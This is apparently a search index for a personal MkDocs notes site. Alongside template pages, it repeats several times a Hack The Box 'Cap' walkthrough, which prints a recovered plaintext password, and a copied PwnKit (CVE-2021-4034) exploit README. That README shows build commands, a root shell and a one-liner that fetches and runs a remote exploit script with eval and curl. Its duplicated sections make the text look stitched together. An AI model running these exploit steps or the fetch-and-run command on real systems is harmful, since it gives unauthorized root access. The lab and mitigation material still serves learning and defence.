{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Obsidian Notes","text":"<p>Publish your public notes with MkDocs</p>"},{"location":"#hello-world","title":"Hello World!","text":"<p>The <code>index.md</code> in the <code>/docs</code> folder is the homepage you see here.</p> <p>The folders in <code>/docs</code> appear as the main sections on the navigation bar.</p> <p>The notes appear as pages within these sections. For example, Note 1 in <code>Topic 1</code></p>"},{"location":"Features/LaTeX%20Math%20Support/","title":"LaTeX Math Support","text":"<p>LaTeX math is supported using MathJax.</p> <p>Inline math looks like \\(f(x) = x^2\\). The input for this is <code>$f(x) = x^2$</code>. Use <code>$...$</code>.</p> <p>For a block of math, use <code>$$...$$</code> on separate lines</p> <pre><code>$$\nF(x) = \\int^a_b \\frac{1}{2}x^4\n$$\n</code></pre> <p>gives </p> \\[ F(x) = \\int^a_b \\frac{1}{2}x^4 \\]"},{"location":"Features/Mermaid%20Diagrams/","title":"Mermaid diagrams","text":"<p>Here's the example from MkDocs Material documentation: </p> <pre><code>graph LR\n  A[Start] --&gt; B{Error?};\n  B --&gt;|Yes| C[Hmm...];\n  C --&gt; D[Debug];\n  D --&gt; B;\n  B ----&gt;|No| E[Yay!];</code></pre>"},{"location":"Features/Text%20Formatting/","title":"Text Formatting","text":"<p>You can have lists like this</p> <ul> <li>first</li> <li>second</li> <li>third</li> </ul> <p>Or checklist lists to</p> <ul> <li> Get</li> <li> things</li> <li> done</li> </ul> <p>Also, get highlights and strikethroughs as above (similar to Obsidian).</p> <p>More formatting options for your webpage here. (but not compatible with Obsidian)</p>"},{"location":"Topic%201/CAP/","title":"CAP","text":"<pre><code>\"0\":\n  - Cap.png\nimage: https:/labs.hackthebox.com/storage/avatars/70ea3357a2d090af11a0953ec8717e90.png\ndescription: \" Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root. \"\n</code></pre>"},{"location":"Topic%201/CAP/#enumeration","title":"Enumeration","text":""},{"location":"Topic%201/CAP/#nmap","title":"Nmap","text":"<p>```nmap 10.10.10.245 -sC -sV -A -p 21,80</p> <p>PORT   STATE SERVICE VERSION 21/tcp open  ftp     vsftpd 3.0.3 80/tcp open  http    gunicorn</p> <p><pre><code>![[Pasted image 20241209004509.png]]\n\nRunning an nmap scan we find 3 open ports\n\n## WEB \n----------------------------------------------\nAccessing the web we find a dashboard\n![[Pasted image 20241209004730.png]]\n\nWe discover changing the number after data gives us access to other users data\n\n![[Pasted image 20241209004959.png]]\n\nWe download user 0's pcap file \n![[Pasted image 20241209005255.png]]\n\n## Wireshark\n-------------------------\nDownloading and analyzing a pcap file we dowloaded from user 0 we find user credentials \n![[Pasted image 20241209005855.png]]\n</code></pre> name: nathan password: Buck3tH4TF0RM3!</p> <p>```</p>"},{"location":"Topic%201/CAP/#ftp","title":"FTP","text":"<p>Using the credentials we find we are able to gain access to FTP  ![[Pasted image 20241209004325.png]]</p> <p>After accessing Ftp we find user.txt our first flag</p>"},{"location":"Topic%201/CAP/#initial-access","title":"Initial Access","text":""},{"location":"Topic%201/CAP/#ssh","title":"SSH","text":"<p>Using the credentialls we found we are able to access SSH  ![[Pasted image 20241209010327.png]]</p>"},{"location":"Topic%201/CAP/#reconnaissance","title":"Reconnaissance","text":""},{"location":"Topic%201/CAP/#linpeas","title":"Linpeas","text":"<p>Linpeas reveals how to get root access through pythin3.8 ![[Pasted image 20241209012010.png]]</p>"},{"location":"Topic%201/CAP/#gtfobins","title":"GtfoBins","text":"<p>Going to https://gtfobins.github.io/gtfobins/python/#capabilities we find how best to abuse this ![[Pasted image 20241209012741.png]]</p>"},{"location":"Topic%201/CAP/#privilege-escalation","title":"Privilege Escalation","text":"<p>Running the binary we achieve root access ![[Pasted image 20241209012926.png]] We navigate to /root and we find the root.txt ![[Pasted image 20241209013100.png]]</p> <p>END!!!!!!!!!!!"},{"location":"Topic%201/Note%201/","title":"Note 1","text":"<p>Example: link to Mermaid Diagrams under <code>Features</code></p>"},{"location":"Topic%201/Note%202/","title":"Note 2","text":""},{"location":"blog/","title":"Blog","text":""},{"location":"blog/cap/CAP/","title":"CAP","text":"<pre><code>\"0\":\n  - Cap.png\nimage: https:/labs.hackthebox.com/storage/avatars/70ea3357a2d090af11a0953ec8717e90.png\ndescription: \" Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root. \"\n</code></pre>"},{"location":"blog/cap/CAP/#enumeration","title":"Enumeration","text":""},{"location":"blog/cap/CAP/#nmap","title":"Nmap","text":"<p>```nmap 10.10.10.245 -sC -sV -A -p 21,80</p> <p>PORT   STATE SERVICE VERSION 21/tcp open  ftp     vsftpd 3.0.3 80/tcp open  http    gunicorn</p> <p><pre><code>![[Pasted image 20241209004509.png]]\n\nRunning an nmap scan we find 3 open ports\n\n## WEB \n----------------------------------------------\nAccessing the web we find a dashboard\n![[Pasted image 20241209004730.png]]\n\nWe discover changing the number after data gives us access to other users data\n\n![[Pasted image 20241209004959.png]]\n\nWe download user 0's pcap file \n![[Pasted image 20241209005255.png]]\n\n## Wireshark\n-------------------------\nDownloading and analyzing a pcap file we dowloaded from user 0 we find user credentials \n![[Pasted image 20241209005855.png]]\n</code></pre> name: nathan password: Buck3tH4TF0RM3!</p> <p>```</p>"},{"location":"blog/cap/CAP/#ftp","title":"FTP","text":"<p>Using the credentials we find we are able to gain access to FTP  ![[Pasted image 20241209004325.png]]</p> <p>After accessing Ftp we find user.txt our first flag</p>"},{"location":"blog/cap/CAP/#initial-access","title":"Initial Access","text":""},{"location":"blog/cap/CAP/#ssh","title":"SSH","text":"<p>Using the credentialls we found we are able to access SSH  ![[Pasted image 20241209010327.png]]</p>"},{"location":"blog/cap/CAP/#reconnaissance","title":"Reconnaissance","text":""},{"location":"blog/cap/CAP/#linpeas","title":"Linpeas","text":"<p>Linpeas reveals how to get root access through pythin3.8 ![[Pasted image 20241209012010.png]]</p>"},{"location":"blog/cap/CAP/#gtfobins","title":"GtfoBins","text":"<p>Going to https://gtfobins.github.io/gtfobins/python/#capabilities we find how best to abuse this ![[Pasted image 20241209012741.png]]</p>"},{"location":"blog/cap/CAP/#privilege-escalation","title":"Privilege Escalation","text":"<p>Running the binary we achieve root access ![[Pasted image 20241209012926.png]] We navigate to /root and we find the root.txt ![[Pasted image 20241209013100.png]]</p> <p>END!!!!!!!!!!!"},{"location":"blog/cap/CVE-2021-4034-main/","title":"CVE-2021-4034","text":"<p>One day for the polkit privilege escalation exploit</p> <p>Just execute <code>make</code>, <code>./cve-2021-4034</code> and enjoy your root shell.</p> <p>The original advisory by the real authors is here</p>"},{"location":"blog/cap/CVE-2021-4034-main/#poc","title":"PoC","text":"<p>If the exploit is working you'll get a root shell immediately:</p> <pre><code>vagrant@ubuntu-impish:~/CVE-2021-4034$ make\ncc -Wall --shared -fPIC -o pwnkit.so pwnkit.c\ncc -Wall    cve-2021-4034.c   -o cve-2021-4034\necho \"module UTF-8// PWNKIT// pwnkit 1\" &gt; gconv-modules\nmkdir -p GCONV_PATH=.\ncp /usr/bin/true GCONV_PATH=./pwnkit.so:.\nvagrant@ubuntu-impish:~/CVE-2021-4034$ ./cve-2021-4034\n# whoami\nroot\n# exit\n</code></pre> <p>Updating polkit on most systems will patch the exploit, therefore you'll get the usage and the program will exit: <pre><code>vagrant@ubuntu-impish:~/CVE-2021-4034$ ./cve-2021-4034\npkexec --version |\n       --help |\n       --disable-internal-agent |\n       [--user username] PROGRAM [ARGUMENTS...]\n\nSee the pkexec manual page for more details.\nvagrant@ubuntu-impish:~/CVE-2021-4034$\n</code></pre></p>"},{"location":"blog/cap/CVE-2021-4034-main/#dry-run","title":"Dry Run","text":"<p>To not execute a shell but just test if the system is vulnerable compile the <code>dry-run</code> target.</p> <p>If the program exit printing \"root\" it means that your system is vulnerable to the exploit. <pre><code>vagrant@ubuntu-impish:~/CVE-2021-4034$ make dry-run\n...\nvagrant@ubuntu-impish:~/CVE-2021-4034$ dry-run/dry-run-cve-2021-4034\nroot\nvagrant@ubuntu-impish:~/CVE-2021-4034$ echo $?\n1\n</code></pre></p> <p>If your system is not vulnerable it prints an error and exit. <pre><code>vagrant@ubuntu-impish:~/CVE-2021-4034$ dry-run/dry-run-cve-2021-4034\npkexec --version |\n       --help |\n       --disable-internal-agent |\n       [--user username] PROGRAM [ARGUMENTS...]\n\nSee the pkexec manual page for more details.\nvagrant@ubuntu-impish:~/CVE-2021-4034$ echo $?\n0\n</code></pre></p>"},{"location":"blog/cap/CVE-2021-4034-main/#about-polkit-pkexec-for-linux","title":"About Polkit pkexec for Linux","text":"<p>Polkit (formerly PolicyKit) is a component for controlling system-wide privileges in Unix-like operating systems. It provides an organized way for non-privileged processes to communicate with privileged processes. It is also possible to use polkit to execute commands with elevated privileges using the command pkexec followed by the command intended to be executed (with root permission).</p>"},{"location":"blog/cap/CVE-2021-4034-main/#one-liner-commands","title":"One-liner commands","text":"<p>You can easily exploit the system using a single script, downloadable and executable with this command:</p> <pre><code>eval \"$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)\"\n</code></pre> <pre><code>vagrant@ubuntu-impish:~/CVE-2021-4034$ whoami\nvagrant\nvagrant@ubuntu-impish:~/CVE-2021-4034$ eval \"$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)\"\ncc -Wall --shared -fPIC -o pwnkit.so pwnkit.c\ncc -Wall    cve-2021-4034.c   -o cve-2021-4034\necho \"module UTF-8// PWNKIT// pwnkit 1\" &gt; gconv-modules\nmkdir -p GCONV_PATH=.\ncp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.\n# whoami\nroot\n</code></pre>"},{"location":"blog/cap/CVE-2021-4034-main/#mitigation","title":"Mitigation","text":"<p>If no patches are available for your operating system, you can remove the SUID-bit from pkexec as a temporary mitigation. <pre><code># chmod 0755 /usr/bin/pkexec\n</code></pre></p> <p>The exploit then will fail complaining that <code>pkexec</code> must have the setuid bit enabled. <pre><code>vagrant@ubuntu-impish:/vagrant/CVE-2021-4034$ sudo chmod 0755 /usr/bin/pkexec\nvagrant@ubuntu-impish:/vagrant/CVE-2021-4034$ ./cve-2021-4034\nGLib: Cannot convert message: Could not open converter from \u201cUTF-8\u201d to \u201cPWNKIT\u201d\npkexec must be setuid root\n</code></pre></p>"},{"location":"cap/CAP/","title":"CAP","text":"<pre><code>\"0\":\n  - Cap.png\nimage: https:/labs.hackthebox.com/storage/avatars/70ea3357a2d090af11a0953ec8717e90.png\ndescription: \" Cap is an easy difficulty Linux machine running an HTTP server that performs administrative functions including performing network captures. Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. The capture contains plaintext credentials and can be used to gain foothold. A Linux capability is then leveraged to escalate to root. \"\n</code></pre>"},{"location":"cap/CAP/#enumeration","title":"Enumeration","text":""},{"location":"cap/CAP/#nmap","title":"Nmap","text":"<p>```nmap 10.10.10.245 -sC -sV -A -p 21,80</p> <p>PORT   STATE SERVICE VERSION 21/tcp open  ftp     vsftpd 3.0.3 80/tcp open  http    gunicorn</p> <p><pre><code>![[Pasted image 20241209004509.png]]\n\nRunning an nmap scan we find 3 open ports\n\n## WEB \n----------------------------------------------\nAccessing the web we find a dashboard\n![[Pasted image 20241209004730.png]]\n\nWe discover changing the number after data gives us access to other users data\n\n![[Pasted image 20241209004959.png]]\n\nWe download user 0's pcap file \n![[Pasted image 20241209005255.png]]\n\n## Wireshark\n-------------------------\nDownloading and analyzing a pcap file we dowloaded from user 0 we find user credentials \n![[Pasted image 20241209005855.png]]\n</code></pre> name: nathan password: Buck3tH4TF0RM3!</p> <p>```</p>"},{"location":"cap/CAP/#ftp","title":"FTP","text":"<p>Using the credentials we find we are able to gain access to FTP  ![[Pasted image 20241209004325.png]]</p> <p>After accessing Ftp we find user.txt our first flag</p>"},{"location":"cap/CAP/#initial-access","title":"Initial Access","text":""},{"location":"cap/CAP/#ssh","title":"SSH","text":"<p>Using the credentialls we found we are able to access SSH  ![[Pasted image 20241209010327.png]]</p>"},{"location":"cap/CAP/#reconnaissance","title":"Reconnaissance","text":""},{"location":"cap/CAP/#linpeas","title":"Linpeas","text":"<p>Linpeas reveals how to get root access through pythin3.8 ![[Pasted image 20241209012010.png]]</p>"},{"location":"cap/CAP/#gtfobins","title":"GtfoBins","text":"<p>Going to https://gtfobins.github.io/gtfobins/python/#capabilities we find how best to abuse this ![[Pasted image 20241209012741.png]]</p>"},{"location":"cap/CAP/#privilege-escalation","title":"Privilege Escalation","text":"<p>Running the binary we achieve root access ![[Pasted image 20241209012926.png]] We navigate to /root and we find the root.txt ![[Pasted image 20241209013100.png]]</p> <p>END!!!!!!!!!!!"},{"location":"cap/CVE-2021-4034-main/","title":"CVE-2021-4034","text":"<p>One day for the polkit privilege escalation exploit</p> <p>Just execute <code>make</code>, <code>./cve-2021-4034</code> and enjoy your root shell.</p> <p>The original advisory by the real authors is here</p>"},{"location":"cap/CVE-2021-4034-main/#poc","title":"PoC","text":"<p>If the exploit is working you'll get a root shell immediately:</p> <pre><code>vagrant@ubuntu-impish:~/CVE-2021-4034$ make\ncc -Wall --shared -fPIC -o pwnkit.so pwnkit.c\ncc -Wall    cve-2021-4034.c   -o cve-2021-4034\necho \"module UTF-8// PWNKIT// pwnkit 1\" &gt; gconv-modules\nmkdir -p GCONV_PATH=.\ncp /usr/bin/true GCONV_PATH=./pwnkit.so:.\nvagrant@ubuntu-impish:~/CVE-2021-4034$ ./cve-2021-4034\n# whoami\nroot\n# exit\n</code></pre> <p>Updating polkit on most systems will patch the exploit, therefore you'll get the usage and the program will exit: <pre><code>vagrant@ubuntu-impish:~/CVE-2021-4034$ ./cve-2021-4034\npkexec --version |\n       --help |\n       --disable-internal-agent |\n       [--user username] PROGRAM [ARGUMENTS...]\n\nSee the pkexec manual page for more details.\nvagrant@ubuntu-impish:~/CVE-2021-4034$\n</code></pre></p>"},{"location":"cap/CVE-2021-4034-main/#dry-run","title":"Dry Run","text":"<p>To not execute a shell but just test if the system is vulnerable compile the <code>dry-run</code> target.</p> <p>If the program exit printing \"root\" it means that your system is vulnerable to the exploit. <pre><code>vagrant@ubuntu-impish:~/CVE-2021-4034$ make dry-run\n...\nvagrant@ubuntu-impish:~/CVE-2021-4034$ dry-run/dry-run-cve-2021-4034\nroot\nvagrant@ubuntu-impish:~/CVE-2021-4034$ echo $?\n1\n</code></pre></p> <p>If your system is not vulnerable it prints an error and exit. <pre><code>vagrant@ubuntu-impish:~/CVE-2021-4034$ dry-run/dry-run-cve-2021-4034\npkexec --version |\n       --help |\n       --disable-internal-agent |\n       [--user username] PROGRAM [ARGUMENTS...]\n\nSee the pkexec manual page for more details.\nvagrant@ubuntu-impish:~/CVE-2021-4034$ echo $?\n0\n</code></pre></p>"},{"location":"cap/CVE-2021-4034-main/#about-polkit-pkexec-for-linux","title":"About Polkit pkexec for Linux","text":"<p>Polkit (formerly PolicyKit) is a component for controlling system-wide privileges in Unix-like operating systems. It provides an organized way for non-privileged processes to communicate with privileged processes. It is also possible to use polkit to execute commands with elevated privileges using the command pkexec followed by the command intended to be executed (with root permission).</p>"},{"location":"cap/CVE-2021-4034-main/#one-liner-commands","title":"One-liner commands","text":"<p>You can easily exploit the system using a single script, downloadable and executable with this command:</p> <pre><code>eval \"$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)\"\n</code></pre> <pre><code>vagrant@ubuntu-impish:~/CVE-2021-4034$ whoami\nvagrant\nvagrant@ubuntu-impish:~/CVE-2021-4034$ eval \"$(curl -s https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.sh)\"\ncc -Wall --shared -fPIC -o pwnkit.so pwnkit.c\ncc -Wall    cve-2021-4034.c   -o cve-2021-4034\necho \"module UTF-8// PWNKIT// pwnkit 1\" &gt; gconv-modules\nmkdir -p GCONV_PATH=.\ncp -f /usr/bin/true GCONV_PATH=./pwnkit.so:.\n# whoami\nroot\n</code></pre>"},{"location":"cap/CVE-2021-4034-main/#mitigation","title":"Mitigation","text":"<p>If no patches are available for your operating system, you can remove the SUID-bit from pkexec as a temporary mitigation. <pre><code># chmod 0755 /usr/bin/pkexec\n</code></pre></p> <p>The exploit then will fail complaining that <code>pkexec</code> must have the setuid bit enabled. <pre><code>vagrant@ubuntu-impish:/vagrant/CVE-2021-4034$ sudo chmod 0755 /usr/bin/pkexec\nvagrant@ubuntu-impish:/vagrant/CVE-2021-4034$ ./cve-2021-4034\nGLib: Cannot convert message: Could not open converter from \u201cUTF-8\u201d to \u201cPWNKIT\u201d\npkexec must be setuid root\n</code></pre></p>"}]}